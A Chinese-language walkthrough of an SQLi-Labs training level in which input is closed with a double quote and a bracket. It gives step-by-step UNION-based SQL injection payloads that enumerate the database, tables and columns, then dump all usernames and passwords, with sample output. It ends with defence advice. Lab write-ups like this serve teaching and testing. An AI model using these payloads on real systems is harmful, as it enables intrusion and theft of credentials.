## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：简单
- 通关标识：发现双引号和括号的闭合方式，利用 UNION 联合查询出所有账号密码。

## 二、大白话原理讲解
前几关我们都在跟单引号打交道，这次“死脑筋柜员”换规矩了，他不再用单引号，改用**双引号**来包裹你的输入了，而且外面还套了一个**括号**。

就好比你拿着钥匙去开锁，结果发现锁孔换了形状。如果你还拿着单引号（`'`）去戳，柜员会直接报错。但是没关系，他报错的声音会告诉我们正确的钥匙形状。

你只要递给他一个双引号 `"`，他报错时会喊出：`near '"1"") LIMIT`。你一听，哦，原来不仅需要双引号，还需要一个右括号 `)` 来凑成一对。于是你把 `")` 这把新钥匙递给他，门就开了。剩下的，就是进金库拿钱了。

## 三、解题步骤

**1. 测试注入点并观察报错**
输入 `?id=1"`（注意是双引号），页面报错：
`You have an error in your SQL syntax; ... right syntax to use near '"1"") LIMIT 0,1' at line 1`
**分析**：看 `near` 后面的内容，双引号后面紧跟着一个右括号 `)`。说明后台 SQL 语句是 `SELECT * FROM users WHERE id = ("$id") LIMIT 0,1`。我们需要用 `")` 来闭合它，并用 `--+` 注释掉后面的内容。

**2. 确认列数（ORDER BY）**
用闭合符测试列数：
```sql
?id=1") order by 1 --+
?id=1") order by 2 --+
?id=1") order by 3 --+
?id=1") order by 4 --+  (报错：Unknown column '4' in 'order clause')
```
**结论**：原查询结果共有 3 列。

**3. 寻找回显点（UNION SELECT）**
构造 `-1")` 让原查询失效，并联合查询：
```sql
?id=-1") union select 1,2,3 --+
```
**结论**：页面回显了 `2` 和 `3`，说明第 2 和第 3 列是回显点。

**4. 爆库、爆表、爆数据**
利用回显点，直接拖库：

*   **查当前数据库名**：
```sql
?id=-1") union select 1,database(),3 --+
```
（回显库名为 `security`）

*   **查数据库下的表名**：
```sql
?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```
（查出有 `users` 等表）

*   **查 `users` 表的字段名**：
```sql
?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```
（查出有 `username`, `password` 等字段）

*   **最终爆出账号密码**：
```sql
?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+
```
*(注：`0x3a` 是冒号的十六进制)*

**5. 验证结果**
提交后，页面成功回显出所有账号密码，例如：
```text
Your Login name: Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:...
```
成功通关。

## 四、知识点解析
1. **双引号注入**：后台使用双引号包裹变量。输入单引号可能不报错，输入双引号才能闭合。
2. **闭合与注释**：闭合符号（如 `")`）后必须跟 `--+` 或 `#`，注释掉后方多余的语句。
3. **UNION SELECT 的通用性**：无论闭合方式怎么变，只要页面有回显，UNION 联合查询永远是最高效的“爆数据”手段。

## 五、总结与防御
**本题总结**：
遇到双引号+括号的变形注入，不要慌，通过看报错信息，找到缺失的那个闭合字符（比如 `")`），然后用正确的组合将其闭合掉即可。

**安全防御建议**：
- **强制类型转换**：对于本应是数字型的参数，服务端强制使用 `intval()`，可以直接防住。
- **预编译语句（PDO/MySQLi）**：最根本的防御手段，彻底杜绝注入漏洞。
